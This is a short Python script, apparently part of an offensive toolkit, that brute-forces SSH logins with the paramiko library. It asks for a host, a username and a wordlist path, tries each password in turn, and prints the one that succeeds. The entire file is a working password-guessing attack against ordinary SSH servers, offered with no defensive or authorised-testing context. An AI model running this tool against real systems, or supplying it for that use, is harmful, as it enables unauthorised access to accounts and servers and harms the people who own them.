import paramiko
from colorama import Fore
from tqdm import tqdm

def run():
    host = input("\n[+] SSH Host: ").strip()
    user = input("[+] Username: ").strip()
    wordlist = input("[+] Wordlist Path: ").strip()

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(wordlist) as f:
            passwords = f.readlines()
        
        for password in tqdm(passwords, desc=Fore.YELLOW + "Bruteforcing"):
            try:
                ssh.connect(host, username=user, password=password.strip(), timeout=5)
                print(Fore.GREEN + f"\n[+] Success! Password: {password.strip()}")
                return
            except:
                continue
        print(Fore.RED + "\n[!] Password not found")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}")